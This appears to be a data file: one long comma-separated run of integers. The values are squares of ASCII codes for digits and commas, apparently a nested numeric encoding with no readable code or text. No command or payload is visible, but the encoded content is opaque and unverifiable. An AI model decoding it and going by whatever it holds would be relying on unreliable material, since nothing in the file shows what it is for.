,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,3249,2500,3249,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,3249,2500,3249,1936,2401,2704,2401,2916,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2601,2704,2809,2916,1936,2500,2916,2304,2401,1936,2500,3136,2304,3249,1936,2704,2500,2500,2809,1936,3249,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2500,3136,2304,3249,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2500,2401,2304,2304,1936,2401,2304,2704,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2401,2304,3136,2401,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2401,2401,2304,2500,2809,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2304,2704,2401,1936,2601,2500,2704,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2601,2500,2704,3249,1936,3025,2809,2916,3249,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2809,2304,2704,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2601,2500,2704,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,3249,2704,2304,3249,1936,2809,2704,3025,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2916,3025,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2704,2304,3249,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2401,2304,2500,2704,1936,2401,2500,2500,2809,1936,2500,2401,2401,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2500,3025,2304,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,3136,2401,2304,2304,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,3136,2304,2401,1936,2401,3249,2601,2916,1936,2500,3249,2401,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2500,2809,1936,2401,2704,3136,3136,2704,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2601,2704,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2704,2304,3249,2916,1936,2401,2704,3136,3136,2704,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2704,2304,2401,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,3025,2809,2916,3249,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2304,3136,2401,2916,1936,2809,2401,3136,2704,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2809,3249,2500,3249,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2500,2304,2500,2809,1936,3025,3025,2704,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,3249,2500,2401,1936,2809,2304,2704,2401,1936,2601,2304,2500,2809,1936,2401,2500,3249,3249,2916,1936,2809,2304,2704,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2601,2704,2809,2916,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2500,2601,2304,2704,1936,2809,2704,3025,2916,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2500,2401,2401,2916,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2809,2304,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500